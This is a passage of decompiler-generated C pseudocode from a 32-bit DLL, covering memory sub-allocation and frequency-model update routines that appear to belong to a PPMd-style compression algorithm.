    while ( ++v1 != 38 )
    {
      if ( dword_100BF814[2 * v1] )
      {
        v6 = &dword_100BF810[2 * v1];
        v7 = v6[1];
        v8 = *(_DWORD *)(v7 + 4);
        --*v6;
        v6[1] = v8;
        sub_100358B9(a1, v1, v7);
        return v7;
      }
    }
    v9 = 12 * (unsigned __int8)byte_100BEFB0[a1];
    --dword_100BD400;
    if ( dword_100BEFA8 - dword_100BD3F4 <= v9 )
    {
      return 0;
    }
    else
    {
      dword_100BEFA8 -= v9;
      return dword_100BEFA8;
    }
  }
  else
  {
    v3 = &dword_100BF810[v2];
    result = dword_100BF810[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  return result;
}
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD400: using guessed type int dword_100BD400;
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814[];

//----- (10035BD5) --------------------------------------------------------
int __usercall sub_10035BD5@<eax>(int a1@<eax>)
{
  int v1; // edi
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int v6; // ecx

  v1 = (unsigned __int8)byte_100BEFDF[a1];
  v2 = 2 * v1;
  if ( dword_100BF814[2 * v1] )
  {
    v3 = &dword_100BF810[v2];
    result = dword_100BF810[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  else
  {
    v6 = 12 * (unsigned __int8)byte_100BEFB0[v1];
    result = dword_100BE190;
    dword_100BE190 += v6;
    if ( dword_100BE190 > (unsigned int)dword_100BD404 )
    {
      dword_100BE190 -= v6;
      return sub_10035B40(v1);
    }
  }
  return result;
}
// 100BD404: using guessed type int dword_100BD404;
// 100BE190: using guessed type int dword_100BE190;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814[];

//----- (10035C2D) --------------------------------------------------------
int sub_10035C2D()
{
  int result; // eax
  int v1; // ecx

  if ( dword_100BD404 == dword_100BE190 )
  {
    result = dword_100BF814[0];
    if ( dword_100BF814[0] )
    {
      v1 = *(_DWORD *)(dword_100BF814[0] + 4);
      --dword_100BF810[0];
      dword_100BF814[0] = v1;
    }
    else
    {
      return sub_10035B40(0);
    }
  }
  else
  {
    result = dword_100BD404 - 12;
    dword_100BD404 -= 12;
  }
  return result;
}
// 100BD404: using guessed type int dword_100BD404;
// 100BE190: using guessed type int dword_100BE190;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814[];

//----- (10035C66) --------------------------------------------------------
_DWORD *__usercall sub_10035C66@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax
  char *v6; // edx

  v4 = a2;
  result = (_DWORD *)(a1 + 8);
  v6 = (char *)a2 - a1;
  do
  {
    *v4 = *(result - 2);
    v4[1] = *(result - 1);
    *(_DWORD *)((char *)result + (_DWORD)v6) = *result;
    v4 += 3;
    result += 3;
    --a3;
  }
  while ( a3 );
  return result;
}

//----- (10035C91) --------------------------------------------------------
_DWORD *__usercall sub_10035C91@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  int v2; // ebx
  _DWORD *v4; // edx
  int *v5; // eax
  _DWORD *v6; // [esp+4h] [ebp-4h]

  v2 = byte_100BEFE0[a1 - 1];
  if ( v2 == byte_100BEFE0[a1] )
    return a2;
  v4 = (_DWORD *)sub_10035BD5(a1 + 1);
  v6 = v4;
  if ( v4 )
  {
    sub_10035C66((int)a2, v4, a1);
    v5 = &dword_100BF810[2 * v2];
    a2[1] = v5[1];
    v5[1] = (int)a2;
    *a2 = -1;
    a2[2] = a1;
    ++*v5;
  }
  return v6;
}
// 100BEFE0: using guessed type unsigned __int8 byte_100BEFE0[128];
// 100BF810: using guessed type int dword_100BF810[];

//----- (10035CE3) --------------------------------------------------------
_DWORD *__usercall sub_10035CE3@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>)
{
  int v3; // edi
  int v4; // eax
  int v5; // ecx
  int *v6; // eax
  _DWORD *v7; // ebx
  int v8; // ecx
  int *v9; // eax
  int v10; // ecx

  v3 = (unsigned __int8)byte_100BEFDF[a1];
  v4 = (unsigned __int8)byte_100BEFDF[a2];
  if ( v3 != v4 )
  {
    v5 = 2 * v4;
    if ( dword_100BF814[2 * v4] )
    {
      v6 = &dword_100BF810[v5];
      v7 = (_DWORD *)dword_100BF810[v5 + 1];
      v8 = v7[1];
      --*v6;
      v6[1] = v8;
      sub_10035C66((int)a3, v7, a2);
      v9 = &dword_100BF810[2 * v3];
      v10 = (unsigned __int8)byte_100BEFB0[v3];
      a3[1] = v9[1];
      v9[1] = (int)a3;
      *a3 = -1;
      a3[2] = v10;
      ++*v9;
      return v7;
    }
    sub_100358B9(v4, v3, (int)a3);
  }
  return a3;
}
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814[];

//----- (10035D52) --------------------------------------------------------
int *__usercall sub_10035D52@<eax>(int a1@<eax>, _DWORD *a2@<ecx>)
{
  int v2; // eax
  int v3; // edx
  int *result; // eax

  v2 = (unsigned __int8)byte_100BEFDF[a1];
  v3 = (unsigned __int8)byte_100BEFB0[v2];
  result = &dword_100BF810[2 * v2];
  a2[1] = result[1];
  result[1] = (int)a2;
  *a2 = -1;
  a2[2] = v3;
  ++*result;
  return result;
}
// 100BF810: using guessed type int dword_100BF810[];

//----- (10035D7B) --------------------------------------------------------
_DWORD *__usercall sub_10035D7B@<eax>(_DWORD *result@<eax>)
{
  if ( result == (_DWORD *)dword_100BEFA8 )
  {
    *result = -1;
    dword_100BEFA8 += 12;
  }
  else
  {
    result[1] = dword_100BF814;
    dword_100BF814 = (int)result;
    *result = -1;
    result[2] = 1;
    ++dword_100BF810[0];
  }
  return result;
}
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814;

//----- (10035DAD) --------------------------------------------------------
_DWORD *__usercall sub_10035DAD@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  _DWORD *v5; // edx
  int v6; // ecx
  int v7; // eax
  _DWORD *v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  v2 = (unsigned __int8)byte_100BEFDF[a2];
  v3 = dword_100BEFA8;
  v10 = v2;
  if ( (unsigned int)a1 > dword_100BEFA8 + 0x4000 )
    return a1;
  v4 = 2 * v2;
  if ( (unsigned int)a1 > dword_100BF814[2 * v2] )
    return a1;
  v5 = (_DWORD *)dword_100BF814[2 * v2];
  v6 = v5[1];
  --dword_100BF810[2 * v2];
  dword_100BF814[2 * v2] = v6;
  v9 = v5;
  sub_10035C66((int)a1, v5, a2);
  v7 = (unsigned __int8)byte_100BEFB0[v10];
  if ( a1 == (_DWORD *)v3 )
  {
    dword_100BEFA8 = 12 * v7 + v3;
  }
  else
  {
    a1[1] = dword_100BF814[v4];
    dword_100BF814[v4] = (int)a1;
    *a1 = -1;
    a1[2] = v7;
    ++dword_100BF810[v4];
  }
  return v9;
}
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814[];

//----- (10035E3E) --------------------------------------------------------
int *sub_10035E3E()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edx
  int v2; // edi
  _DWORD *v3; // ecx
  _DWORD *v4; // ecx
  int *v5; // edx
  int v6; // edi
  int *result; // eax
  _DWORD v9[38]; // [esp+Ch] [ebp-98h] BYREF

  memset(v9, 0, sizeof(v9));
  v0 = (_DWORD *)dword_100BEFA8;
  v1 = (_DWORD *)dword_100BEFA8;
  if ( *(_DWORD *)dword_100BEFA8 == -1 )
  {
    do
    {
      v2 = v0[2];
      v0 += 3 * v2;
      v3 = &v9[(unsigned __int8)byte_100BEFDF[v2]];
      ++*v3;
      *v1 = 0;
      v1 = v0;
    }
    while ( *v0 == -1 );
    dword_100BEFA8 = (int)v0;
  }
  v4 = v9;
  v5 = dword_100BF810;
  v6 = 38;
  do
  {
    result = v5;
    while ( *v4 )
    {
      do
      {
        if ( *(_DWORD *)result[1] )
          break;
        result[1] = *(_DWORD *)(result[1] + 4);
        --*v5;
      }
      while ( (*v4)-- != 1 );
      result = (int *)result[1];
    }
    v5 += 2;
    ++v4;
    --v6;
  }
  while ( v6 );
  return result;
}
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];

//----- (10035EFB) --------------------------------------------------------
int __usercall sub_10035EFB@<eax>(int result@<eax>)
{
  unsigned __int8 v1; // cl

  v1 = *(_BYTE *)(result + 2);
  if ( v1 < 7u && (*(_BYTE *)(result + 3))-- == 1 )
  {
    *(_WORD *)result *= 2;
    *(_BYTE *)(result + 2) = v1 + 1;
    *(_BYTE *)(result + 3) = 3 << v1;
  }
  return result;
}

//----- (10035F46) --------------------------------------------------------
void *sub_10035F46()
{
  int v0; // esi
  int v1; // eax
  unsigned int v2; // ecx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // ecx
  unsigned int i; // edx
  _BYTE *v8; // eax
  unsigned int v9; // ecx
  unsigned int j; // eax
  int v11; // esi
  char v12; // al
  int v13; // edx

  v0 = 4;
  v1 = 1;
  v2 = 4;
  do
  {
    byte_100BEFB0[v1 - 1] = v1;
    ++v1;
    --v0;
  }
  while ( v0 );
  v3 = v1 + 1;
  do
  {
    byte_100BEFB0[v2++] = v3;
    v3 += 2;
  }
  while ( v2 < 8 );
  v4 = v3 + 1;
  while ( v2 < 0xC )
  {
    byte_100BEFB0[v2++] = v4;
    v4 += 3;
  }
  v5 = v4 + 1;
  while ( v2 < 0x26 )
  {
    byte_100BEFB0[v2++] = v5;
    v5 += 4;
  }
  v6 = 0;
  for ( i = 0; i < 0x80; ++i )
  {
    v8 = (char *)&unk_100BEFE0 + i;
    v6 += (unsigned __int8)byte_100BEFB0[v6] < i + 1;
    *v8 = v6;
  }
  byte_100BE2A0 = 0;
  byte_100BE2A1 = 2;
  memset(&unk_100BE2A2, 4, 9u);
  memset(&unk_100BE2AB, 6, 0xF5u);
  v9 = 5;
  for ( j = 0; j < 5; ++j )
    byte_100BE198[j] = j;
  v11 = 1;
  v12 = 5;
  v13 = 1;
  do
  {
    --v13;
    byte_100BE198[v9] = v12;
    if ( !v13 )
    {
      v13 = ++v11;
      ++v12;
    }
    ++v9;
  }
  while ( v9 < 0x104 );
  dword_100BE3A4 = -2069057649;
  return &unk_100BF80C;
}
// 100BE2A0: using guessed type char byte_100BE2A0;
// 100BE2A1: using guessed type char byte_100BE2A1;
// 100BE3A4: using guessed type int dword_100BE3A4;

//----- (10036031) --------------------------------------------------------
char *__userpurge sub_10036031@<eax>(int a1@<eax>, int a2)
{
  char *result; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  unsigned int i; // eax
  _WORD *v8; // ebx
  char *v9; // eax
  _WORD *v10; // esi
  unsigned int j; // ecx
  char *v12; // esi
  int v13; // edi
  unsigned __int8 v14; // dl
  int v15; // esi
  _DWORD *v16; // ecx
  int v17; // edi
  char *v18; // [esp+8h] [ebp-8h]
  int v19; // [esp+8h] [ebp-8h]
  int v20; // [esp+Ch] [ebp-4h]
  unsigned int v21; // [esp+18h] [ebp+8h]
  int v22; // [esp+18h] [ebp+8h]

  memset(byte_100BD410, 0, sizeof(byte_100BD410));
  byte_100BD3FB = 1;
  byte_100BD3F8 = 1;
  if ( a1 >= 2 )
  {
    dword_100BE3A0 = a1;
    dword_100BD3D8 = a1;
    dword_100BEFD8 = a2;
    sub_100359A9();
    if ( a1 >= 12 )
      a1 = 12;
    dword_100BD40C = -1 - a1;
    dword_100BE29C = -1 - a1;
    v4 = sub_10035C2D();
    dword_100BD408 = v4;
    *(_DWORD *)(v4 + 8) = 0;
    *(_BYTE *)v4 = -1;
    *(_WORD *)(v4 + 2) = 257;
    v5 = sub_10035BD5(128);
    v6 = 0;
    *(_DWORD *)(v4 + 4) = v5;
    byte_100BD3F9 = 0;
    for ( i = 0; i < 0x600; i += 6 )
    {
      *(_BYTE *)(i + *(_DWORD *)(v4 + 4)) = v6;
      *(_BYTE *)(*(_DWORD *)(v4 + 4) + i + 1) = 1;
      *(_DWORD *)(*(_DWORD *)(v4 + 4) + i + 2) = 0;
      ++v6;
    }
    v21 = 0;
    v20 = 0;
    v18 = byte_100BE198;
    v8 = &unk_100BD510;
    do
    {
      v9 = v18;
      while ( (unsigned __int8)*v9 == v21 )
      {
        v9 = &byte_100BE198[++v20];
        v18 = &byte_100BE198[v20];
      }
      v10 = v8;
      for ( j = 0; j < 8; ++j )
        *v10++ = 0x4000 - (unsigned __int16)word_100950E4[j] / (unsigned int)(v20 + 1);
      v12 = (char *)(v8 + 8);
      v13 = 7;
      do
      {
        memcpy(v12, v8, 0x10u);
        v12 += 16;
        --v13;
      }
      while ( v13 );
      ++v21;
      v8 += 64;
    }
    while ( v21 < 0x19 );
    v14 = byte_100BE19B;
    v15 = 0;
    v22 = 3;
    result = (char *)&unk_100BE3A8;
    v19 = 24;
    do
    {
      while ( v14 == v22 )
        v14 = byte_100BE19C[v15++];
      *(_WORD *)result = 16 * v15 + 40;
      result[2] = 3;
      result[3] = 7;
      v16 = result + 4;
      v17 = 31;
      do
      {
        *v16++ = *(_DWORD *)result;
        --v17;
      }
      while ( v17 );
      ++v22;
      result += 128;
      --v19;
    }
    while ( v19 );
  }
  else
  {
    dword_100BD3D8 = dword_100BE3A0;
    result = (char *)dword_100BD408;
    while ( 1 )
    {
      result = (char *)*((_DWORD *)result + 2);
      if ( !result )
        break;
      --dword_100BD3D8;
    }
  }
  return result;
}
// 100950E4: using guessed type __int16 word_100950E4[];
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3F9: using guessed type char byte_100BD3F9;
// 100BD3FB: using guessed type char byte_100BD3FB;
// 100BD408: using guessed type int dword_100BD408;
// 100BD40C: using guessed type int dword_100BD40C;
// 100BE19B: using guessed type char byte_100BE19B;
// 100BE29C: using guessed type int dword_100BE29C;
// 100BE3A0: using guessed type int dword_100BE3A0;
// 100BEFD8: using guessed type int dword_100BEFD8;

//----- (100361E4) --------------------------------------------------------
_BYTE *__userpurge sub_100361E4@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3)
{
  _BYTE *result; // eax
  int v4; // esi
  char v5; // cl
  int v6; // ecx
  int v7; // esi
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // [esp+4h] [ebp-4h]

  v11 = *a2;
  result = sub_10035CE3(a3, (v11 + 2) >> 1, *((_DWORD **)a2 + 1));
  v4 = *((unsigned __int16 *)a2 + 1);
  v5 = a2[1] & (4 * (a1 + 4));
  *((_DWORD *)a2 + 1) = result;
  a2[1] = 8 * (*result >= 0x40u) + v5;
  v6 = (unsigned __int8)result[1];
  v7 = v4 - v6;
  v8 = (v6 + a1) >> a1;
  result[1] = v8;
  *((_WORD *)a2 + 1) = (unsigned __int8)v8;
  do
  {
    v9 = (unsigned __int8)result[7];
    result += 6;
    v7 -= v9;
    v10 = (v9 + a1) >> a1;
    result[1] = v10;
    *((_WORD *)a2 + 1) += (unsigned __int8)v10;
    a2[1] |= 8 * (*result >= 0x40u);
    --v11;
  }
  while ( v11 );
  *((_WORD *)a2 + 1) += (a1 + v7) >> a1;
  return result;
}

//----- (10036274) --------------------------------------------------------
unsigned __int8 *__thiscall sub_10036274(unsigned __int8 *this, int a2)
{
  char *v3; // eax
  int v4; // ebx
  char *v5; // edi
  int v6; // eax
  __int16 v7; // cx
  _DWORD *v8; // ecx
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]

  if ( !*this )
  {
    if ( *((_DWORD *)this + 1) >= (unsigned int)dword_100BEFA8 )
    {
      *((_DWORD *)this + 1) = a2 >= dword_100BE3A0 ? 0 : sub_10036274(a2 + 1);
      if ( *((_DWORD *)this + 1) || a2 <= 9 )
        return this;
    }
LABEL_21:
    sub_10035D7B(this);
    return 0;
  }
  v10 = (*this + 2) >> 1;
  v3 = (char *)sub_10035DAD(*((_DWORD **)this + 1), v10);
  v4 = *this;
  v5 = &v3[6 * v4];
  *((_DWORD *)this + 1) = v3;
  if ( v5 >= v3 )
  {
    v11 = 6 * v4;
    do
    {
      if ( *(_DWORD *)(v5 + 2) >= (unsigned int)dword_100BEFA8 )
      {
        if ( a2 >= dword_100BE3A0 )
          *(_DWORD *)(v5 + 2) = 0;
        else
          *(_DWORD *)(v5 + 2) = sub_10036274(a2 + 1);
      }
      else
      {
        *(_DWORD *)(v5 + 2) = 0;
        v6 = v11 + *((_DWORD *)this + 1);
        v7 = *(_WORD *)v5;
        *(_WORD *)v5 = *(_WORD *)v6;
        *(_DWORD *)(v5 + 2) = *(_DWORD *)(v6 + 2);
        *(_DWORD *)(v6 + 2) = 0;
        --v4;
        v11 -= 6;
        *(_WORD *)v6 = v7;
      }
      v5 -= 6;
    }
    while ( (unsigned int)v5 >= *((_DWORD *)this + 1) );
  }
  if ( v4 == *this || !a2 )
    return this;
  v8 = (_DWORD *)*((_DWORD *)this + 1);
  *this = v4;
  if ( v4 < 0 )
  {
    sub_10035D52(v10, v8);
    goto LABEL_21;
  }
  if ( v4 )
  {
    sub_100361E4(*((unsigned __int16 *)this + 1) > 16 * v4, this, v10);
  }
  else
  {
    this[1] = (this[1] & 0x10) + 8 * (*(_BYTE *)v8 >= 0x40u);
    *((_WORD *)this + 1) = *(_WORD *)v8;
    *((_DWORD *)this + 1) = *(_DWORD *)((char *)v8 + 2);
    sub_10035D52(v10, v8);
    this[3] = (this[3] + 11) >> 3;
  }
  return this;
}
// 100BE3A0: using guessed type int dword_100BE3A0;
// 100BEFA8: using guessed type int dword_100BEFA8;

//----- (100363D8) --------------------------------------------------------
_DWORD *__thiscall sub_100363D8(_DWORD *this, int a2)
{
  _BYTE *v3; // eax
  unsigned int v5; // eax
  unsigned int v6; // esi

  if ( *(_BYTE *)this )
  {
    v5 = this[1];
    v6 = v5 + 6 * *(unsigned __int8 *)this;
    if ( v6 >= v5 )
    {
      do
      {
        if ( *(_DWORD *)(v6 + 2) < (unsigned int)dword_100BEFA8 || a2 >= dword_100BE3A0 )
          *(_DWORD *)(v6 + 2) = 0;
        else
          *(_DWORD *)(v6 + 2) = sub_100363D8(a2 + 1);
        v6 -= 6;
      }
      while ( v6 >= this[1] );
    }
  }
  else
  {
    if ( this[1] < (unsigned int)dword_100BEFA8 || a2 >= dword_100BE3A0 )
      this[1] = 0;
    else
      this[1] = sub_100363D8(a2 + 1);
    if ( !this[1] )
    {
      v3 = (_BYTE *)this[2];
      if ( !*v3 || v3[1] == 0xFF )
      {
        sub_10035D52(1, this);
        return 0;
      }
    }
  }
  return this;
}
// 100BE3A0: using guessed type int dword_100BE3A0;
// 100BEFA8: using guessed type int dword_100BEFA8;

//----- (10036481) --------------------------------------------------------
char *__cdecl sub_10036481(unsigned __int8 *a1, unsigned __int8 *a2, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  _DWORD *v6; // eax
  unsigned __int8 v7; // al
  int v8; // edi
  char *result; // eax
  int v10; // eax
  int v11; // eax

  v3 = (unsigned __int8 *)dword_100BD408;
  v4 = (unsigned __int8 *)dword_100BD408;
  for ( dword_100BD3F4 = (int)Block; v4 != a1; v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2) )
  {
    if ( (*v4)-- == 1 )
    {
      v6 = (_DWORD *)*((_DWORD *)v4 + 1);
      v4[1] = (v4[1] & 0x10) + 8 * (*(_BYTE *)v6 >= 0x40u);
      *((_WORD *)v4 + 1) = *(_WORD *)v6;
      *((_DWORD *)v4 + 1) = *(_DWORD *)((char *)v6 + 2);
      sub_10035D7B(v6);
      v4[3] = (v4[3] + 11) >> 3;
    }
    else
    {
      sub_100361E4(0, v4, (*v4 + 3) >> 1);
    }
  }
  while ( v4 != a2 )
  {
    v7 = *v4;
    if ( *v4 )
    {
      *((_WORD *)v4 + 1) += 4;
      if ( *((unsigned __int16 *)v4 + 1) > 4 * v7 + 128 )
        sub_100361E4(1, v4, (v7 + 2) >> 1);
    }
    else
    {
      v4[3] -= v4[3] >> 1;
    }
    v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2);
  }
  v8 = dword_100BEFD8;
  if ( dword_100BEFD8 > 2 )
  {
    dword_100BD408 = a3;
    result = (char *)((dword_100BF818 & 1) == 0);
    dword_100BD400 += (int)result;
    return result;
  }
  if ( dword_100BEFD8 == 2 )
  {
    while ( 1 )
    {
      v10 = *((_DWORD *)v3 + 2);
      if ( !v10 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_100BD408 = v10;
    }
    sub_100363D8(v3, 0);
    dword_100BEFD8 = 3;
  }
  else
  {
    if ( !dword_100BEFD8 || sub_10035932() < (unsigned int)dword_100B6A4C >> 1 )
    {
      result = sub_10036031(dword_100BE3A0, v8);
      byte_100BD3F8 = 0;
      byte_100BD3FB = -1;
      return result;
    }
    while ( 1 )
    {
      v11 = *((_DWORD *)v3 + 2);
      if ( !v11 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_100BD408 = v11;
    }
    while ( 1 )
    {
      sub_10036274(v3, 0);
      sub_10035E3E();
      if ( sub_10035932() <= 3 * ((unsigned int)dword_100B6A4C >> 2) )
        break;
      v3 = (unsigned __int8 *)dword_100BD408;
    }
  }
  result = (char *)dword_100BE3A0;
  dword_100BD400 = 0;
  dword_100BD3D8 = dword_100BE3A0;
  return result;
}
// 100B6A4C: using guessed type int dword_100B6A4C;
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3FB: using guessed type char byte_100BD3FB;
// 100BD400: using guessed type int dword_100BD400;
// 100BD408: using guessed type int dword_100BD408;
// 100BE3A0: using guessed type int dword_100BE3A0;
// 100BEFD8: using guessed type int dword_100BEFD8;
// 100BF818: using guessed type int dword_100BF818;

//----- (10036600) --------------------------------------------------------
int __usercall sub_10036600@<eax>(int a1@<eax>, int a2@<ecx>)
{
  unsigned int v2; // ebx
  int i; // esi
  bool v4; // zf
  int v5; // ecx
  char v6; // dl
  int v7; // edi
  int v8; // eax
  unsigned __int8 v9; // dl
  unsigned __int8 v10; // al
  int *v11; // eax
  unsigned __int8 *v13; // eax
  int v14; // [esp+Ch] [ebp-4Ch] BYREF
  char v15; // [esp+10h] [ebp-48h] BYREF
  int v16; // [esp+4Ch] [ebp-Ch]
  int *v17; // [esp+50h] [ebp-8h]
  char v18; // [esp+56h] [ebp-2h]
  unsigned __int8 v19; // [esp+57h] [ebp-1h]

  ++dword_100BD3D8;
  v2 = dword_100BD3F4;
  i = a2;
  v4 = a2 == 0;
  v5 = dword_100BE194;
  v6 = *(_BYTE *)dword_100BE194;
  v7 = a1;
  v16 = a1;
  v18 = v6;
  v14 = dword_100BE194;
  v17 = (int *)&v15;
  *(_DWORD *)(dword_100BE194 + 2) = dword_100BD3F4;
  if ( v4 )
    goto LABEL_3;
  v7 = *(_DWORD *)(a1 + 8);
  while ( !*(_DWORD *)(i + 2) )
  {
    v11 = v17++;
    ++dword_100BD3D8;
    v6 = v18;
    *v11 = i;
    *(_DWORD *)(i + 2) = v2;
LABEL_3:
    v8 = *(_DWORD *)(v7 + 8);
    if ( !v8 )
    {
      if ( dword_100BEFD8 > 2 )
      {
        do
LABEL_15:
          *(_DWORD *)(*--v17 + 2) = v7;
        while ( v17 != &v14 );
        dword_100BD3F4 = (int)Block + 1;
        dword_100BD3D8 = 1;
      }
      return v7;
    }
    v7 = *(_DWORD *)(v7 + 8);
    if ( *(_BYTE *)v8 )
    {
      for ( i = *(_DWORD *)(v8 + 4); *(_BYTE *)i != v6; i += 6 )
        ;
      v9 = *(_BYTE *)(i + 1);
      v10 = 2 * (v9 < 0x73u);
      v19 = v10;
      *(_BYTE *)(i + 1) = v10 + v9;
      *(_WORD *)(v7 + 2) += v10;
    }
    else
    {
      i = v8 + 2;
      *(_BYTE *)(v7 + 3) = *(_BYTE *)(v8 + 3) + (*(_BYTE *)(v8 + 3) < 0x20u);
    }
  }
  if ( dword_100BEFD8 > 2 )
  {
    v7 = *(_DWORD *)(i + 2);
    goto LABEL_15;
  }
  if ( *(_DWORD *)(i + 2) <= v2 )
  {
    v17 = (int *)v5;
    dword_100BE194 = i;
    v13 = sub_100368FB((unsigned __int8 *)v7, 0, 0);
    v5 = (int)v17;
    *(_DWORD *)(i + 2) = v13;
    dword_100BE194 = v5;
  }
  if ( dword_100BD3D8 == 1 && v16 == dword_100BD408 )
  {
    *(_DWORD *)(v5 + 2) = *(_DWORD *)(i + 2);
    dword_100BD3F4 = v2 - 1;
  }
  return *(_DWORD *)(i + 2);
}
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD408: using guessed type int dword_100BD408;
// 100BE194: using guessed type int dword_100BE194;
// 100BEFD8: using guessed type int dword_100BEFD8;

//----- (10036736) --------------------------------------------------------
char __usercall sub_10036736@<al>(unsigned __int8 *a1@<edi>)
{
  int i; // eax
  __int16 v2; // dx
  int v3; // esi
  _WORD *v4; // ebx
  unsigned int v5; // esi
  unsigned int v6; // ecx
  int v7; // ecx
  unsigned int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // eax
  unsigned int v11; // esi
  int v12; // ecx
  bool v13; // zf
  unsigned __int8 v14; // al
  int v15; // eax
  int v16; // eax
  _DWORD *v17; // eax
  unsigned __int8 v18; // cl
  int v19; // edx
  _BYTE *v20; // esi
  __int16 v22; // [esp+8h] [ebp-14h]
  __int16 v23; // [esp+8h] [ebp-14h]
  int v24; // [esp+Ah] [ebp-12h]
  int v25; // [esp+Ah] [ebp-12h]
  int v26; // [esp+10h] [ebp-Ch]
  unsigned int v27; // [esp+10h] [ebp-Ch]
  BOOL v28; // [esp+14h] [ebp-8h]
  int v29; // [esp+18h] [ebp-4h]

  v29 = *a1;
  for ( i = dword_100BE194; i != *((_DWORD *)a1 + 1); i -= 6 )
  {
    v2 = *(_WORD *)i;
    v3 = *(_DWORD *)(i + 2);
    *(_WORD *)i = *(_WORD *)(i - 6);
    *(_DWORD *)(i + 2) = *(_DWORD *)(i - 4);
    *(_DWORD *)(i - 4) = v3;
    *(_WORD *)(i - 6) = v2;
  }
  *(_BYTE *)(i + 1) += 4;
  v4 = a1 + 2;
  *((_WORD *)a1 + 1) += 4;
  v5 = *((unsigned __int16 *)a1 + 1) - *(unsigned __int8 *)(i + 1);
  v28 = dword_100BD3D8 || dword_100BEFD8 > 2;
  v6 = (v28 + (unsigned int)*(unsigned __int8 *)(i + 1)) >> 1;
  *(_BYTE *)(i + 1) = v6;
  *v4 = (unsigned __int8)v6;
  do
  {
    v7 = *(unsigned __int8 *)(i + 7);
    i += 6;
    v5 -= v7;
    v8 = (unsigned int)(v28 + v7) >> 1;
    *(_BYTE *)(i + 1) = v8;
    *v4 += (unsigned __int8)v8;
    if ( *(_BYTE *)(i + 1) > *(_BYTE *)(i - 5) )
    {
      v22 = *(_WORD *)i;
      v9 = i;
      v24 = *(_DWORD *)(i + 2);
      do
      {
        v26 = v9 - 6;
        *(_WORD *)v9 = *(_WORD *)(v9 - 6);
        *(_DWORD *)(v9 + 2) = *(_DWORD *)(v9 - 4);
        v9 = v26;
      }
      while ( HIBYTE(v22) > *(_BYTE *)(v26 - 5) );
      *(_WORD *)v26 = v22;
      *(_DWORD *)(v26 + 2) = v24;
    }
    --v29;
  }
  while ( v29 );
  v10 = (_BYTE *)(i + 1);
  if ( *v10 )
    goto LABEL_23;
  do
  {
    ++v29;
    v10 -= 6;
  }
  while ( !*v10 );
  v11 = v29 + v5;
  v12 = (*a1 + 2) >> 1;
  v14 = *a1 - v29;
  v13 = *a1 == (unsigned __int8)v29;
  v27 = v11;
  *a1 = v14;
  if ( !v13 )
  {
    v17 = sub_10035CE3(v12, (v14 + 2) >> 1, *((_DWORD **)a1 + 1));
    a1[1] &= ~8u;
    v18 = a1[1];
    v19 = *a1;
    v20 = v17;
    *((_DWORD *)a1 + 1) = v17;
    a1[1] = v18 | (8 * (*(_BYTE *)v17 >= 0x40u));
    do
    {
      v20 += 6;
      a1[1] |= 8 * (*v20 >= 0x40u);
      --v19;
    }
    while ( v19 );
    v5 = v27;
LABEL_23:
    v16 = *((_DWORD *)a1 + 1);
    *v4 += v5 - (v5 >> 1);
    a1[1] |= 4u;
    dword_100BE194 = v16;
    return v16;
  }
  v15 = *((_DWORD *)a1 + 1);
  LOBYTE(v23) = *(_WORD *)v15;
  v25 = *(_DWORD *)(v15 + 2);
  HIBYTE(v23) = (v11 + 2 * (unsigned __int8)HIBYTE(*(_WORD *)v15) - 1) / v11;
  if ( HIBYTE(v23) > 0x29u )
    HIBYTE(v23) = 41;
  sub_10035D52(v12, *((_DWORD **)a1 + 1));
  *v4 = v23;
  *((_DWORD *)a1 + 1) = v25;
  LOBYTE(v16) = (a1[1] & 0x10) + 8 * ((unsigned __int8)v23 >= 0x40u);
  a1[1] = v16;
  dword_100BE194 = (int)(a1 + 2);
  return v16;
}
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BE194: using guessed type int dword_100BE194;
// 100BEFD8: using guessed type int dword_100BEFD8;

//----- (100368FB) --------------------------------------------------------
